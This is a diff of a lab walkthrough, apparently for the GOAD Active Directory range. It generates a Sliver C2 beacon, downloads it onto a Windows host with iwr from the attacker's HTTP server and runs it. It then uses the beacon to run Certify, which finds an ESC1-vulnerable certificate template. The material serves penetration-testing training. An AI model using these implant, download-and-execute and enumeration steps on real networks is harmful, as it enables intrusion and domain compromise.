@@ -386,14 +386,13 @@ sliver >
 
 In sliver, generate a beacon 
 ```bash
-sliver > generate beacon --http 192.168.56.100
+sliver >  generate beacon --seconds 27 --jitter 3 --os windows --arch amd64 --http 192.168.56.100 --name beacon --save /tmp/beacon.exe
 
-[*] Generating new windows/amd64 beacon implant binary (1m0s)
+[*] Generating new windows/amd64 beacon implant binary (27s)
 [*] Symbol obfuscation is enabled
-[*] Build completed in 1m0s
-[*] Implant saved to /home/goad/OTHER_WITCH.exe
+[*] Build completed in 1m35s
+[*] Implant saved to /tmp/beacon.exe
 
-[*] Beacon 094da7cd OTHER_WITCH - 192.168.56.22:50267 (castelblack) - windows/amd64 - Tue, 21 Nov 2023 11:06:50 UTC
 ```
 
 Now setup a job to await the connection from the beacon
@@ -409,13 +408,13 @@ sliver > jobs
 
  ID   Name   Protocol   Port   Stage Profile 
 ==== ====== ========== ====== ===============
- 3    http   tcp        80
+ 1    http   tcp        80
 ```
 
 Go back to the RDP Session and transfer the .exe over of call from SMB share
 
 ```powershell
-PS C:\Users\samwell.tarly> iwr http://192.168.56.100:8080/OTHER_WITHC.exe -O goad.exe
+PS C:\Users\samwell.tarly> iwr http://192.168.56.100:8080/beacon.exe -o beacon.exe
 PS C:\Users\samwell.tarly> ls
 
 
@@ -424,32 +423,33 @@ PS C:\Users\samwell.tarly> ls
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
-d-r---       11/20/2023   7:34 PM                3D Objects
-d-r---       11/20/2023   7:34 PM                Contacts
-d-r---       11/20/2023   7:34 PM                Desktop
-d-r---       11/20/2023   7:34 PM                Documents
-d-r---       11/20/2023   7:34 PM                Downloads
-d-r---       11/20/2023   7:34 PM                Favorites
-d-r---       11/20/2023   7:34 PM                Links
-d-r---       11/20/2023   7:34 PM                Music
-d-r---       11/20/2023   7:34 PM                Pictures
-d-r---       11/20/2023   7:34 PM                Saved Games
-d-r---       11/20/2023   7:34 PM                Searches
-d-r---       11/20/2023   7:34 PM                Videos
--a----       11/21/2023  11:06 AM       17265664 goad.exe
+d-r---       11/25/2023  10:56 AM                3D Objects
+d-r---       11/25/2023  10:56 AM                Contacts
+d-r---       11/25/2023  10:56 AM                Desktop
+d-r---       11/25/2023  10:56 AM                Documents
+d-r---       11/25/2023  10:56 AM                Downloads
+d-r---       11/25/2023  10:56 AM                Favorites
+d-r---       11/25/2023  10:56 AM                Links
+d-r---       11/25/2023  10:56 AM                Music
+d-r---       11/25/2023  10:56 AM                Pictures
+d-r---       11/25/2023  10:56 AM                Saved Games
+d-r---       11/25/2023  10:56 AM                Searches
+d-r---       11/25/2023  10:56 AM                Videos
+-a----       11/25/2023  11:06 AM       17221120 beacon.exe
 
-PS C:\Users\samwell.tarly> .\goad.exe
+
+PS C:\Users\samwell.tarly> .\beacon.exe
 ```
 Check back in Sliver and we shpuld have our beacon returned to us
 
 ```bash
-[*] Beacon 094da7cd OTHER_WITCH - 192.168.56.22:50267 (castelblack) - windows/amd64 - Tue, 21 Nov 2023 11:06:50 UTC
+[*] Beacon 17150820 beacon - 192.168.56.22:52761 (castelblack) - windows/amd64 - Sat, 25 Nov 2023 11:06:49 UTC
 
 sliver > beacons
 
- ID         Name          Transport   Hostname      Username              Operating System   Last Check-In   Next Check-In 
-========== ============= =========== ============= ===================== ================== =============== ===============
- 094da7cd   OTHER_WITCH   http(s)     castelblack   NORTH\samwell.tarly   windows/amd64      12s             51s           
+ ID         Name     Transport   Hostname      Username              Operating System   Last Check-In   Next Check-In 
+========== ======== =========== ============= ===================== ================== =============== ===============
+ 17150820   beacon   http(s)     castelblack   NORTH\samwell.tarly   windows/amd64      28s             1s      
 ```
 
 To interact with the beacon type `use` and the ID of the Beacon. As its a beacon and not an active session, Sliver will wait for the beacon to check in then task it with the commands to run, in this case `ls`
@@ -457,19 +457,19 @@ To interact with the beacon type `use` and the ID of the Beacon. As its a beacon
 You can check which tasks are pending with the `tasks` command
 
 ```bash
-sliver > use 094da7cd
+sliver > use 17150820-11d0-406f-8500-61f8ee6dd515
 
-[*] Active beacon OTHER_WITCH (094da7cd-7f7f-49f3-b6c1-ff5d5f578385)
+[*] Active beacon beacon (17150820-11d0-406f-8500-61f8ee6dd515)
 
-sliver (OTHER_WITCH) > ls
+sliver (beacon) > ls
 
-[*] Tasked beacon OTHER_WITCH (a09c2aff)
+[*] Tasked beacon beacon (48588c0a)
 
-sliver (OTHER_WITCH) > tasks
+sliver (beacon) > tasks
 
  ID         State     Message Type   Created                         Sent   Completed 
 ========== ========= ============== =============================== ====== ===========
- a09c2aff   pending   Ls             Tue, 21 Nov 2023 11:22:16 UTC
+ 48588c0a   pending   Ls             Sat, 25 Nov 2023 11:08:00 UTC     
 
 ```
 
@@ -478,7 +478,7 @@ Now our Beacon is up and running lets look for some vulnerable AD CS Templates.
 First check certify is installed
 
 ```bash
-sliver (OTHER_WITCH) > armory install certify
+sliver (beacon) > armory install certify
 
 [*] Installing alias 'Certify' (v0.0.3) ... done!
 ```
@@ -487,11 +487,11 @@ Now task our Beacon with looking for vulnerable templates. As there are 2 Domain
 
 
 ```bash
-sliver (OTHER_WITCH) > certify find /vulnerable /domain:sevenkingdoms.local
+sliver (beacon) > certify find /vulnerable /domain:sevenkingdoms.local
 
-[*] Tasked beacon OTHER_WITCH (e251386c)
+[*] Tasked beacon beacon (92ad8c97)
 
-[+] OTHER_WITCH completed task e251386c
+[+] beacon completed task 92ad8c97
 
 [*] certify output:
 
@@ -515,10 +515,10 @@ sliver (OTHER_WITCH) > certify find /vulnerable /domain:sevenkingdoms.local
     FullName                      : kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA
     Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
     Cert SubjectName              : CN=SEVENKINGDOMS-CA, DC=sevenkingdoms, DC=local
-    Cert Thumbprint               : C905E6849940A008D2521C895E5FE6DC86C76D2C
-    Cert Serial                   : 17A3937EFC3C5F9A40DE3AE3FB0B5C01
-    Cert Start Date               : 11/14/2023 8:25:05 PM
-    Cert End Date                 : 11/14/2028 8:35:05 PM
+    Cert Thumbprint               : CC0F0FAB15A69172D0316D67C16B82F4AF2EB09D
+    Cert Serial                   : 348FD6202DDB689F4C266F9416C2C477
+    Cert Start Date               : 11/23/2023 7:48:56 PM
+    Cert End Date                 : 11/23/2028 7:58:56 PM
     Cert Chain                    : CN=SEVENKINGDOMS-CA,DC=sevenkingdoms,DC=local
     UserSpecifiedSAN              : Disabled
     CA Permissions                :
@@ -528,21 +528,25 @@ sliver (OTHER_WITCH) > certify find /vulnerable /domain:sevenkingdoms.local
 
       Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
       Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
-      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Domain Admins   S-1-5-21-1377930917-3115711298-3089174014-512
-      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Enterprise AdminsS-1-5-21-1377930917-3115711298-3089174014-519
+      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Domain Admins   S-1-5-21-3592251176-3955304652-3429210345-512
+      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Enterprise AdminsS-1-5-21-3592251176-3955304652-3429210345-519
     Enrollment Agent Restrictions : None
 
 [+] No Vulnerable Certificates Templates found!
+
+
+
+Certify completed in 00:00:00.8200730
 ```
 
 Now on essos.local
 
 ```bash
-sliver (OTHER_WITCH) > certify find /vulnerable /domain:essos.local
+sliver (beacon) > certify find /vulnerable /domain:essos.local
 
-[*] Tasked beacon OTHER_WITCH (3b45957a)
+[*] Tasked beacon beacon (6e899b21)
 
-[+] OTHER_WITCH completed task 3b45957a
+[+] beacon completed task 6e899b21
 
 [*] certify output:
 
@@ -566,10 +570,10 @@ sliver (OTHER_WITCH) > certify find /vulnerable /domain:essos.local
     FullName                      : braavos.essos.local\ESSOS-CA
     Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
     Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
-    Cert Thumbprint               : 78C4CB5A64C20061E88EE899266D085B27239156
-    Cert Serial                   : 272F12DA752A4D9D4A6B66379B961C7A
-    Cert Start Date               : 11/14/2023 8:25:08 PM
-    Cert End Date                 : 11/14/2028 8:35:07 PM
+    Cert Thumbprint               : 6C831117D04055B46B8119AB190A2E9F4BBB1D73
+    Cert Serial                   : 17A6B46504EEABAA433B0FA7AEBD5075
+    Cert Start Date               : 11/23/2023 7:49:01 PM
+    Cert End Date                 : 11/23/2028 7:59:00 PM
     Cert Chain                    : CN=ESSOS-CA,DC=essos,DC=local
     [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
     CA Permissions                :
@@ -579,8 +583,8 @@ sliver (OTHER_WITCH) > certify find /vulnerable /domain:essos.local
 
       Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
       Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
-      Allow  ManageCA, ManageCertificates               ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-      Allow  ManageCA, ManageCertificates               ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+      Allow  ManageCA, ManageCertificates               ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+      Allow  ManageCA, ManageCertificates               ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
     Enrollment Agent Restrictions : None
 
 [!] Vulnerable Certificates Templates :
@@ -597,28 +601,29 @@ sliver (OTHER_WITCH) > certify find /vulnerable /domain:essos.local
     mspki-certificate-application-policy  : Client Authentication
     Permissions
       Enrollment Permissions
-        Enrollment Rights           : ESSOS\Domain Users            S-1-5-21-3804392505-3025572388-606528806-513
-        All Extended Rights         : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        Enrollment Rights           : ESSOS\Domain Users            S-1-5-21-2265185071-3335518114-134020291-513
+        All Extended Rights         : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                       NT AUTHORITY\SYSTEM           S-1-5-18
       Object Control Permissions
-        Owner                       : ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
-        Full Control Principals     : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        Owner                       : ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
+        Full Control Principals     : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                       NT AUTHORITY\SYSTEM           S-1-5-18
-        WriteOwner Principals       : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        WriteOwner Principals       : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                       NT AUTHORITY\SYSTEM           S-1-5-18
-        WriteDacl Principals        : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        WriteDacl Principals        : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                       NT AUTHORITY\SYSTEM           S-1-5-18
-        WriteProperty Principals    : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
-                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        WriteProperty Principals    : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                       NT AUTHORITY\SYSTEM           S-1-5-18
+
 ```
 
 There are a few more vunerable Certificate Templates but for this one we will be focussing on ESC1 - https://posts.specterops.io/certified-pre-owned-d95910965cd2
